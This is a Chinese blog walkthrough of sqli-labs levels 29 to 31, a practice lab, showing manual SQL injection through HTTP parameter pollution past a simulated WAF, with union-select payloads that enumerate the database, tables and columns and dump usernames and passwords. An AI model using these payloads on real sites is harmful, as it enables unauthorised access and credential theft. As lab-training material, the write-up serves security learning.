# 原创
：  （手工）【sqli-labs29-31】参数污染、报错回显、WAF报错跳转、字符型注入

# （手工）【sqli-labs29-31】参数污染、报错回显、WAF报错跳转、字符型注入

**目录**

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、环境准备](#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87)

[1.1、简介：](#1.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[1.2、配置：](#1.2%E3%80%81%E9%85%8D%E7%BD%AE%EF%BC%9A)

[二、（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[三、Less29（GET-Error based -IMPIDENCE MISMATCH - Having a WAF in front of web application）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[3.1、简介：（参数污染-报错回显-字符型注入-waf）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[3.2、第一步：注入点测试](#2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[ 3.3、第二步：分析过滤](#%C2%A02.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4)

[3.4、第三步：判断字段数/回显位](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[3.5、第四步：暴库](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9A%B4%E5%BA%93)

[3.6、第五步：爆表名](#%C2%A0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D)

[3.7、第六步：爆字段](#%C2%A0%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[3.8、第七步：爆数据](#%C2%A0%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[四、Less30（GET-Blind- IMPIDENCE MISMATCH - Having a WAF in front of web application）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[4.1、简介：（参数污染-报错回显-字符型注入-waf）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[4.2、利用：](#4.2%E3%80%81%E5%88%A9%E7%94%A8%EF%BC%9A)

[五、Less31（GET-Blind- IMPIDENCE MISMATCH - Having a WAF in front of web application）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[5.1、简介：（参数污染-报错回显-字符型注入-waf）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[5.2、利用：](#5.2%E3%80%81%E5%88%A9%E7%94%A8%EF%BC%9A)

---


> 
<h2>推荐：</h2>
[【SQL注入-可回显】报错注入：简介、相关函数、利用方法<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125017089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165777639916781647571668%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165777639916781647571668&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125017089-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%8A%A5%E9%94%99&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125017089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165777639916781647571668%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165777639916781647571668&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125017089-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%8A%A5%E9%94%99&amp;spm=1018.2226.3001.4450)
[【SQL注入-无回显】时间盲注：原理、函数、利用过程https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165776808616780366570315%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165776808616780366570315&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165776808616780366570315%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165776808616780366570315&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165776808616780366570315%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165776808616780366570315&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)

[【SQL注入】数字型注入 &amp; 字符型注入https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501)
[【WAF绕过】SQL注入、文件上传、XSShttps://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450)


## 一、环境准备

> 
<h3>1.1、简介：</h3>
本身我们就已经安装了phpstudy
现在我们还需要安装jspstudy
达到双服务器效果
<hr/>
报错会跳转到另一个页面，在这里即jsp服务器中报错页面
也就是hacked.jsp后缀
其实也可以不搭建2个服务器
自己输入hacked.php也可以看见报错页面


> 
<h3>1.2、配置：</h3>
第一步：下载

 第二步：安装
路径中不出现中文名
<hr/>
第三步：配置
要与之前安装的phpstudy端口不冲突，站点端口修改为不一样的
<hr/>
第四步：文件配置
将sqli-labs-master中的tomcat-files压缩包解压到WWW路径下
将URL路径修改为php服务下的相对应关卡路径




---


<br/>  

---


---


## 二、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：分析权限
第三步：判断字段数
第四步：爆数据库名
第五步：爆表名
第六步：爆字段名
第七步：爆数据


---


---


## 三、Less29（GET-Error based -IMPIDENCE MISMATCH - Having a WAF in front of web application）

> 
<h3>3.1、简介：（参数污染-报错回显-字符型注入-waf）</h3>
请求方法：GET
方法：参数污染+闭合（字符型注入）+报错回显


> 
<h3>3.2、第一步：注入点测试</h3>
输入?id=1 
 后面加上单引号发现报错了
说明是单引号闭合，即是字符型注入
且可利用报错回显

 加上hacked.php可以看见环境搭建好后的报错页面
不过搭建好后跳转的是hacked.jsp


用2个单引号前后闭合后
显示正常


<hr/>
 测试注入语句是否正常
?id=1'%26%26sleep(3)%26%26'1
转了3s
注入语句正常执行






> 
<h3> 3.3、第二步：分析过滤</h3>
方法一：
考虑一步一步将注入语句字符一个一个替换掉，直到不报错（浪费时间）
或者全部替换（如果报错，不知道哪里被过滤了）
<hr/>
方法二：
获取源码进行白盒审计（最优）
<hr/>方法三： 
 eg：输入?id=and or union select --+ updatexml # extractvalue（重要的都输进去）
看输入回显过滤语句的情况


貌似没啥过滤


---


> 
<h3>3.4、第三步：判断字段数/回显位</h3>
?id=1' union select 1,2,3'
回显正常

 ?id=1' union select 1,2,3,4'
报错

 说明字段数为3
<hr/>
判断回显位
?id=-1' union select 1,2,3'





> 
<h3>3.5、第四步：暴库</h3>
?id=1&amp;id=-1' union select 1,2,database() --+





> 
<h3>3.6、第五步：爆表名</h3>
?id=1&amp;id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
 <img alt="" height="847" src="https://img-blog.csdnimg.cn/9b40e574930b4b8a84554bf2fc44bc25.png" width="1200"/>



> 
<h3>3.7、第六步：爆字段</h3>
?id=1&amp;id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+




> 
<h3>3.8、第七步：爆数据</h3>
?id=1&amp;id=-1' union select 1,2,group_concat(username,'-',password) from security.users--+



---


---


---


## 四、Less30（GET-Blind- IMPIDENCE MISMATCH - Having a WAF in front of web application）

> 
<h3>4.1、简介：（参数污染-报错回显-字符型注入-waf）</h3>
请求方法：GET
方法：参数污染+闭合（字符型注入）+报错回显


> 
<h3>4.2、利用：</h3>
与Less29相比
就是将单引号闭合，改为了双引号


---


---


---


## 五、Less31（GET-Blind- IMPIDENCE MISMATCH - Having a WAF in front of web application）

> 
<h3>5.1、简介：（参数污染-报错回显-字符型注入-waf）</h3>
请求方法：GET
方法：参数污染+闭合（字符型注入）+报错回显


> 
<h3>5.2、利用：</h3>
与Less30相比
就是将多了一个括号闭合

